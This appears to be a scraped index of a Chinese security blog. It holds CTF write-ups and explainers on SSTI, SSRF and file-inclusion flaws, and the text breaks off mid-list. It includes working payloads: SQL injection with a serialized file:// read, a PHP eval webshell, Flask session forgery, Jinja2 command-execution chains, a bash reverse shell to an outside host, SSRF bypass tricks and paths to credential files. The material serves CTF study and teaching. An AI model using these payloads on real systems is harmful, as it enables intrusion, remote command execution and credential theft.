fakebook.usersO:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:12:&quot;ww.baidu.com&quot;;&#125;\n\n得到一个反序列化串\n用dirsearch扫一遍目录啥也没有\n查看robots.txt（常用知识点一定要记住）\n\n下载下来得到 一份源码\n&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)  //赋值u    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;    function get($url)  //自定义函数    &#123;\t    \t//初始化 cURL 会话        $ch = curl_init();\t\t//设置url和相对应的选项        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\t\t//抓取url并把它传递给浏览器        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) &#123;            return 404;        &#125;\t\t//关闭curl资源，并释放系统资源        curl_close($ch);\t        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog);    &#125;&#125;\n\n思路明确：利用反序列化和伪协议读取直接flag.php\n\n结合之前的报错信息，可以推测路径为 /var/www/html/flag.php\n因此 写php代码 构建payload\n\n因为data是第四个字段 因此最终的payload为\nhttp://b5de29d4-cf0b-47f7-a63d-7edf1fc2a2c4.node3.buuoj.cn/view.php?no=0%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&#123;s:4:%22name%22;s:5:%22admin%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&#125;%27\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"ZJCTF 2019-NiZhuanSiWei","url":"https://husins.cn/ZJCTF-2019-NiZhuanSiWei/","content":"知识点php伪协议\nhttps://www.anquanke.com/post/id/202510#h3-3\nhttps://www.cherrygk.cn/2018/07/12/phpagree/\n解题\n审计代码，需要 txt  file password三个参数，分段绕过\nif(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))\n这里需要我们对text传参，并让file_get_contents()函数读取内容为 welcome to the zjctf\n因此使用 ?text=data:text/plain,welcome to the zjctfdata://伪协议实现绕过。\n\n过滤了 关键字flag\n\n这里提示读取useless.php，因此file=useless.php。但是php文件会被解析不能输出，因此，用base64编码读取\nphp://filter/read=convert.base64-encode/resource=useless.php\n\n读取到useless.php内容\n\n反手写一个反序列化生成payload：\npassword=O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;file&quot;;N;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;\n最终payload\n?text=data:text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF2020 EasyMD5","url":"https://husins.cn/BJDCTF2020-EasyMD5/","content":"知识点：MD5 \n\nmd5 bypass\nmd5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果都是数组则双双返回FALSE, 两个FALSE相等得以绕过\n解题：\n\n\n输入框传参会是GET传参，查看返回包请求头发现提示，这里尝试了很多次这里我都绕不过去，一次看博客得到：\n传参?password=ffifdyop\n原理：\n经过md5加密后：276f722736c95d99e921722cf9ed621c，Mysql 刚好又会吧 hex 转成 ascii 解释，再转换为字符串：’or’6&lt;乱码&gt; 即  &#39;or&#39;66�]��!r,��b 起始。只要是万能密码就行可以采用md5截断爆破，但是我命不好跑了半小时没跑出来 就直接用网上师傅们的了。\n用途：\nselect * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;\n就相当于select * from admin where password=&#39;&#39;or 1 实现sql注入\n\n查看源码，发现需要md5弱类型比较，有两种做法\n第一种弱类型 传入连个0e…的值e后面的会被当做科学计数法 0 = 0 实现绕过\n第二种数组编码之后会返回false false=false 实现绕过\n\n===弱类型不可以了，但是可以第二种方法\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"UNCTF之easyunserialize","url":"https://husins.cn/UNCTF之easyunserialize/","content":"知识点：PHP 在反序列化时，底层代码是以;作为字段的分隔，以&#125;作为结尾(数组、对象等类型)；反序列化时，结尾后的字符串会被忽略掉，当出现字符串替换函数得时候，就可以存在反序列化逃逸漏洞\n当替换后字符变多：由于膨胀，导致后面的字符被挤掉，所以执行我们传入的代码\n当替换后字符变少：由于缩水，导致前面的字符被吃掉了，所以执行了我们后面构造的代码\n解题：\n经过分析，构造payload。\n\n;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;\n得到我们要传入的参数（起始也可以直接写出来要是熟悉的话）\n我们发现这串字符有 29个。而我们根据替换只能控制溢出为4的倍数，因此这里有个骚姿势传入一个没有用的参数，使得我们构造的传参为4的倍数\npaylaod：&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:5:&quot;aaaaa&quot;;s:4:&quot;easy&quot;;&#125;\n此时是52个字符为4的倍数，构造脚本。\n\n\n","categories":["CTF题解"],"tags":["UNCTF"]},{"title":"# BUUCTF之[极客大挑战 2019]BuyFlag","url":"https://husins.cn/BUUCTF之-极客大挑战-2019-BuyFlag/","content":"知识点is_numberic:可以使用%00和%20绕过\nstrcmp()：这一个漏洞适用与5.3之前版本的php\nstrcmp(&#x27;str1&#x27;,&#x27;str2&#x27;)    if(str1&gt;str2) return &gt;0    if(str1&lt;str2) return &lt;0    if(str1 == str2) return 0    if(str1 = arry[] &amp;&amp; str2 = string) return 0\n\n\n\n解题\n打开题目 打开payflag的功能菜单，提示flag需要100000000 money\n\n结合上述提示可知 获得flag需要三个步骤\n1.a student from CUIT\n2.输入正确的密码\n3.输入正确的金额\n第一点是身份验证，可以看一下cookie\n](https://imgchr.com/i/sjNmZT)\n可以发现cookie很简单 就是user=0 因此是不是可以推测 user=1就可以完成CUIT的身份确认\n\n查看源码发现这里有对密码的提示，\n\n根据审计可知 要绕过is_number函数 且 password值为404 所以 POST传参为：password=404%00\n\n依次修改cookie和POST传参，\n\n下一步就是要传入money的值\n\n这里提示数字太长了，因此我们可以推测可能是strcmp比较，\n\n抓个包 发现php版本为5.3.3 可以使用 数组绕过\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF之[SUCTF 2019]CheckIn","url":"https://husins.cn/BUUCTF之-SUCTF-2019-CheckIn/","content":"知识点.user.ini 是什么？​        .user.ini实际上就是自定义的php.ini.通过使用两个方法auto_prepend_file、auto_append_file实现类似于文件包含的功能。\n使用条件：(1)服务器脚本语言为PHP(2)对应目录下面有可执行的php文件(3)服务器使用CGI／FastCGI模式\n解题\n打开图片上传一个正常的 .png 的图片 观察返回的信息 返回了目录路径 返回了当前文件夹存在的 东西\n\n上传图片马 发现 会对图片信息进行  过滤和查看  。  这里 &lt;? 被过滤了 只能换一个 马\n&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[8])&lt;/script&gt;\n\n经过测试 几乎所有后缀 名 全被ban了，只能想想骚姿势\n\n正常不修改文件后缀，可以上传图片马，因此可以使用之前提到的 .user.ini 将图片马 包含到 已经存在的 index.php 里面 。\n\n第一次上传失败了  原因是 不是图片  一次 在构造时 加上一个图片识别的前缀\n\n\n这样就成功上传，可以去 快落的连接蚁剑了。\n\n连接成功 得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF之[HCTF 2018]admin","url":"https://husins.cn/BUUCTF之-HCTF-2018-admin/","content":"知识点flask–session存储机制\n实现\nfrom datetime import timedeltafrom flask import Flask, request, redirect, url_for, sessionapp = Flask(__name__)#设置我们的秘钥 用于对sessionid进行加密app.secret_key=&quot;lH4WHi5amT0ZqykHvLofllRJu3UN1uzmeUN0z2IiacjDUb5TLU3ZTtUP5VJqgkMY&quot;#设置session的过期时间app.permanent_session_lifetime = timedelta(days=7)\n\n调用\n@app.route(&#x27;/&#x27;)def index():    #访问首页时 如果是登录状态 则 提示欢迎信息    username = session.get(&quot;username&quot;)    if username:        #删除session的数据        return &quot;欢迎回来%s&quot;%username    #如果没有登录 跳转到登录页面    return redirect(url_for(&quot;login&quot;))#登录的路由@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def login():    if request.method == &#x27;GET&#x27;:        with open(&quot;login.html&quot;) as f:            login_html_content = f.read()            return login_html_content    #Post处理    username = request.form.get(&quot;username&quot;)    password = request.form.get(&quot;password&quot;)    #验证登录信息    if username == &#x27;zx&#x27; and password==&quot;123&quot;:        print(&quot;登录成功&quot;)        #将我们的状态数据保存到session        session[&quot;username&quot;] = username        #设置session是否持久化（） 默认为false（会话结束自动删除）        session.permanent = True        # #删除字典数据        # session.pop(&quot;username&quot;)        return redirect(url_for(&quot;index&quot;))    else:        return &#x27;登录失败&#x27;if __name__ == &#x27;__main__&#x27;:    app.run()\n\n\n\n解题：\n登陆页面 发现有两个功能 登陆和注册 分别检测 两个功能。 登陆功能没有什么点可以用，只能注册，注册一个test用户登陆看看！\n\n发现有四个功能，返回主页面，提交留言，修改密码，登出\n\n在查看一手源代码，看来在提示要admin登陆了。\n\n修改密码页面存在提示，github上面应该是他的源码，去嫖一手。\n\n这里用到了session，因此可以想到篡改session实现admin登陆\n\n得到 test账号的session 尝试解密\n\n根据脚本得到解密串:\n&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4765861b12328638115df84695bf022807817e5be468dac58d116b15882a91c9cddde6325d9304aabdb9f3edee5ecb738aaa789431c594eb94e960a90fb685ee&#39;, &#39;csrf_token&#39;: b&#39;ebf9106fbf271c5ec3868795513cda5fc4589b28&#39;, &#39;image&#39;: b&#39;9L7q&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n将text改为admin可得\n&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4765861b12328638115df84695bf022807817e5be468dac58d116b15882a91c9cddde6325d9304aabdb9f3edee5ecb738aaa789431c594eb94e960a90fb685ee&#39;, &#39;csrf_token&#39;: b&#39;ebf9106fbf271c5ec3868795513cda5fc4589b28&#39;, &#39;image&#39;: b&#39;9L7q&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n根据flask session的特性 我们还必须找到 加密所需的密钥\n\n在 config.py中找到密钥\n\n在得到加密之后的字符串，将其为session赋值即可admin登陆。\n\n得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"浅析SSTI漏洞","url":"https://husins.cn/浅析SSTI漏洞/","content":"python-flask-ssti(模版注入漏洞)原理：SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。\n模板注入和SQL注入很像，都是用户输入被当做代码执行（因此，“用户的输入都是不可信的”）这句话整的很实用。\n前置知识：1.运行一个一个最小的 Flask 应用from flask import Flaskapp = Flask(__name__)&quot;&quot;&quot;第一部分，初始化：所有的Flask都必须创建程序实例，web服务器使用wsgi协议，把客户端所有的请求都转发给这个程序实例程序实例是Flask的对象，一般情况下用如下方法实例化Flask类只有一个必须指定的参数，即程序主模块或者包的名字，__name__是系统变量，该变量指的是本py文件的文件名`&quot;&quot;&quot;`@app.route(&#x27;/&#x27;)def hello_world():    return __name__#  第二部分，路由和视图函数：#  客户端发送url给web服务器，web服务器将url转发给flask程序实例，程序实例#  需要知道对于每一个url请求启动那一部分代码，所以保存了一个url和python函数的映射关系。#  处理url和函数之间关系的程序，称为路由#  在flask中，定义路由最简便的方式，是使用程序实例的app.route装饰器，把装饰的函数注册为路由 if __name__ == &#x27;__main__&#x27;:    print(&#x27;dd&#x27;,__name__)    app.run()#  第三部分：程序实例用run方法启动flask集成的开发web服务器#  __name__ == &#x27;__main__&#x27;是python常用的方法，表示只有直接启动本脚本时候，才用app.run方法#  如果是其他脚本调用本脚本，程序假定父级脚本会启用不同的服务器，因此不用执行app.run()#  服务器启动后，会启动轮询，等待并处理请求。轮询会一直请求，直到程序停止。\n\n如上述代码所示，app是flask的实例，功能就是接受来自web服务器的请求，\n\n\n浏览器将请求给web服务器，web服务器将请求给app ,\n\napp收到请求，通过路由找到对应的视图函数，然后将请求处理，得到一个响应response\n\n然后app将响应返回给web服务器，\n\nweb服务器返回给浏览器，\n\n浏览器展示给用户观看，流程完毕。\n2.jinja2jnja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。\n\n​        jinja2 存在着三种特殊的语句：\n\n&#123;%   %&#125;：控制结构。\n\n&#123;&#123;   &#125;&#125;：变量取值。被两个括号包裹的内容会输出其表达式的值\n\n&#123;#     #&#125;：注释。\njinja2模板中使用&#123;&#123;   &#125;&#125;语法表示一个变量，他是一种特殊的占位符。当利用jinja2进行渲染时，他会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的python数据类型。\njinja2中的过滤器：\n变量名后面加一根竖线，再跟上过滤器的名字就能使用特定的过滤器修改变量了。\n\n\n\nsafe 过滤器值得特别说明一下。默认情况下，出于安全考虑， Jinja2 会转义所有变量。很多情况下需要显示变量中存储的 HTML 代码，这时就可使用 safe 过滤器。\ninja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。\n3.python魔法函数​    Python内置的以双下划线开头并以双下划线结尾的函数（不能自己定义，没有用），如_等很多，用于实现并定制很多特性，非常灵活，且是隐式调用的。　\n​    魔法函数会直接影响到Python语法本身，如让类变成可迭代的对象，也会影响Python的一些内置函数的调用，如实现len()能对对象调用len()方法。\n常用的魔法函数：https://www.cnblogs.com/small-office/p/9337297.html\n4.python中的object​    在python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，这是两种创建object的方法\nPython中一些常见的特殊方法：\n__class__返回调用的参数类型。__base__返回基类__mro__允许我们在当前Python环境下追溯继承树__subclasses__()返回子类\n\n　\n\n\n   ​    \nssti漏洞检测   检测到模板注入漏洞后，需要准确识别模板引擎的类型。神器Burpsuite 自带检测功能，并对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：\n   \n漏洞利用1.payload原理​    ·Jinja2 模板中可以访问一些 Python 内置变量，如[] {} 等，并且能够使用 Python 变量类型中的一些函数。加上python中的魔术方法，object类中的基本方法。结合这几个 我们可以 实现任意代码的执行。\n2.payload具体思路\n现在我们的思路就是从一个内置变量调用__class__.base__等隐藏属性，去找到一个函数，然后调用其__globals[&#x27;builtins&#x27;]即可调用eval等执行任意代码。\n\nbuiltins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块\n &#x27;&#x27;.__class__.__base__.__subclasses__()# 返回子类的列表 [,,,...]#从中随便选一个类,查看它的__init__ &#x27;&#x27;.__class__.__base__.__subclasses__()[30].__init__slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects# wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性#再换几个子类，很快就能找到一个重载过__init__的类，比如 &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__ &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]#然后用eval执行命令即可\n\n常用的payloadpython2：​    文件的写入和读取\n#读文件&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;  &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;#写文件&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/1&#x27;).write(&quot;&quot;) &#125;&#125;\n\n​    任意执行\n​    每次执行都要先写然后编译执行\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/owned.cfg&#x27;,&#x27;w&#x27;).write(&#x27;code&#x27;)&#125;&#125;  &#123;&#123; config.from_pyfile(&#x27;/tmp/owned.cfg&#x27;) &#125;&#125;  \n\n​    写入一次\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/owned.cfg&#x27;,&#x27;w&#x27;).write(&#x27;from subprocess import check_output\\n\\nRUNCMD = check_output\\n&#x27;)&#125;&#125;  &#123;&#123; config.from_pyfile(&#x27;/tmp/owned.cfg&#x27;) &#125;&#125;  &#123;&#123; config[&#x27;RUNCMD&#x27;](&#x27;/usr/bin/id&#x27;,shell=True) &#125;&#125;    \n\n​    不回显的\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;1+1&#x27;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)&#125;&#125;\n\n​    任意执行只需要一条指令\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)  &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;(system函数换为popen(&#x27;&#x27;).read()，需要导入os模块)  &#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;(不需要导入os模块，直接从别的模块调用)\n\n​    总结\n通过某种类型(字符串:&quot;&quot;，list:[]，int：1)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用object找到能利用的类。还有就是&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&#125;&#125;这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。\n\npython3​        因为python3没有file了，所以用的是open\n​        文件读取\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()&#125;&#125;\n\n​        任意执行\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;\n\n​        命令执行\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n​        \nWAF绕过python2：[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#x27;os.system(&quot;ls&quot;)&#x27;)().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;&#x27;)python3：&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;]&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;os&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;)\n\n例题演示题目：攻防世界之Web_python_template_injection\n连接：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1\n\n打开题目提示存在 python 的模板注入\n\n传参之后页面报错 但是输入的参数 a和x 已经被成功输入。\n.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D,来查看所有模块\n\n3.os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个\n4.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D,查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中\n\n5.使用[&#39;o&#39;+&#39;s&#39;],可绕过对os字符的过滤，访问http://192.168.100.161:62264/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(%22os%22).popen(%22ls%22).read()&#39;%20)%7D%7D查看flag文件所在\n\n6.访问\n","categories":["漏洞总结"],"tags":["SSTI"]},{"title":"浅析SSRF漏洞","url":"https://husins.cn/浅析SSRF/","content":"SSRF(Server-side Request Forge, 服务端请求伪造)什么是 SSRF他是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\nSSRF 形成的原因​    大多数SSRF产生的原因是服务端提供了从其他服务器获取数据的功能,并且没有对目的地址做过滤和限制.比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载\n代码案例\n//curl造成的SSRFfunction curl($url)&#123;      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_exec($ch);    curl_close($ch);&#125;$url = $_GET[&#x27;url&#x27;];curl($url);  //file_get_contents造成的SSRF$url = $_GET[&#x27;url&#x27;];echo file_get_contents($url);//fsockopen造成的SSRF&lt;?phpfunction Getfile($host, $port, $link)&#123;    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);    if(!$fp)&#123;        echo &quot;$errstr (error number $errno) \\n&quot;;    &#125;else&#123;        $out = &quot;GET $link HTTP/1.1\\r\\n&quot;;        $out .= &quot;HOST $host \\r\\n&quot;;        $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;;        $out .= &quot;\\r\\n&quot;;        fwrite($fp, $out);        $content = &#x27;&#x27;;        while(!feof($fp))&#123;            $contents .= fgets($fp, 1024);        &#125;        fclose($fp);        return $contents;    &#125;&#125;\n\n\n\nSSRF攻击流程假定 A 为一个公司的主站,所有人都可以访问, B 是该公司内部的一个网站,只有公司能为能够访问,且与 A 能够相互访问。\n正常用户：\n输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求，并处理 –&gt;返回用户响应\n此时如果A服务器接受请求是没有经过严格的过滤，导致A能够在B上获取数据，就会产生SSRF\n例如:\n正常用户输入的URL:http://www.123.com/index.php?img=www.aaa.com/1.jpg\n攻击者将www.aaa.com换成B的内网地址,如果存在就返回1XX | 2XX的状态码,不存在就会出现其他的状态码\n因此,SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。\nSSRF可能出现的地方(核心就是调用外部资源的所有参数都有可能)\n社交分享功能：获取超链接的标题等内容进行显示\n\n转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n\n在线翻译：给网址翻译对应网页的内容\n\n图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片\n\n图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验\n\n网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n\n数据库内置功能：数据库的比如mongodb的copyDatabase函数\n\n邮件系统：比如接收邮件服务器地址\n\n编码处理, 属性信息处理，文件处理：比如fpmg，ImageMagick，docx，pdf，xml处理器等\n\n从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）\n\n将url换成我们的DNS服务器，通过查看DNFlog平台日志看是否有服务器ip判断是否有SSRF漏洞\n\n\nSSRF的危害\n让服务端去访问相应的网址\n\n让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms\n\n可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件\n\n攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包payload）\n\n判断内网主机是否存活：方法是访问看是否有端口开放\n\nDoS攻击（请求大文件，始终保持连接keep-alive always）\n\n\nSSRF漏洞利用\ndict协议,操作redis服务,例如:dict://127.0.0.1:6379/info\n\nfile协议,任意文件读取,例如:file:///etc/passwd\n\ngopher,反弹shell,例如gopher://127.0.0.1:6379/xxxxxxx\n\nhttp,结合burpsuite探测内网存活主机\n\n\nSSRF利用小技巧\nhttp://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的\n\n各种IP地址的进制转换\n\nURL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/\n\n短网址绕过 http://t.cn/RwbLKDx\n\nxip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意,利用重定向）\n\n限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80\n\n例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host，但这样可以用 http://abc@10.153.138.81/ 绕过\n\n\nSSRF如何防护\n黑名单\n过滤10.0.0.0/8 、172.16.0.0/12、192.168.0.0/16、localhost私有地址、IPv6地址\n过滤file:///、dict://、gopher://、ftp:// 危险协议\n对返回的内容进行识别\n\n\n白名单\n使用地址白名单\n对返回内容进行识别\n需要使用互联网资源（比如贴吧使用网络图片）而无法使用白名单的情况：首先禁用 CURLOPT_FOLLOWLOCATION；然后通过域名获取目标ip，并过滤内部ip；最后识别返回的内容是否与假定内容一致\n\n\n\n","categories":["漏洞总结"],"tags":["SSRF"]},{"title":"浅析文件包含漏洞","url":"https://husins.cn/浅析文件包含漏洞/","content":"文件包含漏洞什么是文件包含​        程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。\n​        简单来说就是为了增加代码的复用性,将重复使用的代码写入一个文件后,通过文件包含函数,在一个文件中包含另一个文件。\n文件包含漏洞形成的原因。​        随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码，就造成了文件包含漏洞。\n示例：\n​            \n&lt;?php    $filename  = $_GET[&#x27;filename&#x27;];    include($filename);?&gt;\n\n$_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改\n$_GET[&#39;filename&#39;]的值，执行非预期的操作。\n文件包含漏洞所使用的函数\ninclude( )当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。\n\ninclude_once( )功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次\n\nrequire( )require()与 include()的区别在于 require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。\n\nrequire_once( )功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。\n\n\n当出现上述四个函数是,就可能出现文件包含漏洞\n文件包含漏洞的危害\n读取本地文件,获取主机上的敏感信息。例如：配置文件，日志，密码\n\n常见的敏感信息路径：\nWindows系统\n\nc:\\boot.ini // 查看系统版本\nc:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件\nc:\\windows\\repair\\sam // 存储Windows系统初次安装的密码\nc:\\ProgramFiles\\mysql\\my.ini // MySQL配置\nc:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码\nc:\\windows\\php.ini // php 配置信息\n\nLinux/Unix系统\n\n/etc/passwd // 账户信息\n/etc/shadow // 账户密码文件\n/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件\n/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 